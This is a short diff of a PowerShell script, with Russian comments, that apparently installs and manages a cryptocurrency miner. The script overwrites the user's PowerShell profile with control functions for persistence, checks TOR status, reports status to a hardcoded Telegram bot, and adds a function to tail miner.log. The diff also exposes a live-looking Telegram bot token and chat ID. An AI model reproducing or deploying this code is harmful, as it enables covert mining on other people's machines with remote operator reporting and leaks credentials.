@@ -20,6 +20,7 @@ $tgToken = "8260191816:AAE2rSVeuDnNG8nt4V-3vGjtfil3_ksqMwE"
 $chatId = "6881699459"
 
 # 4. КОМАНДЫ ПРОФИЛЯ + ФУНКЦИИ (update, check, delete)
+# 4. КОМАНДЫ ПРОФИЛЯ + ФУНКЦИИ (update, check, delete, log)
 $profilePath = "$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
 $profileDir = Split-Path $profilePath
 if (!(Test-Path $profileDir)) { New-Item -Type Directory -Path $profileDir -Force | Out-Null }
@@ -38,6 +39,10 @@ function check {
     `$status += if (`$t) { " | TOR: OK" } else { " | TOR: OFF" }
     Write-Host `$status -ForegroundColor Green
     send-tg "Ручной чек: `$status"
+}
+function log { 
+    Write-Host "--- Нажмите Ctrl+C для выхода из лога ---" -ForegroundColor Cyan
+    Get-Content "$path\miner.log" -Tail 30 -Wait 
 }
 function update {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -65,6 +70,7 @@ function delete {
 }
 "@
 $Functions | Out-File -FilePath $profilePath -Force -Encoding utf8
+
 
 # 5. ЗАГРУЗКА ФАЙЛОВ (Исправлено)
 if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
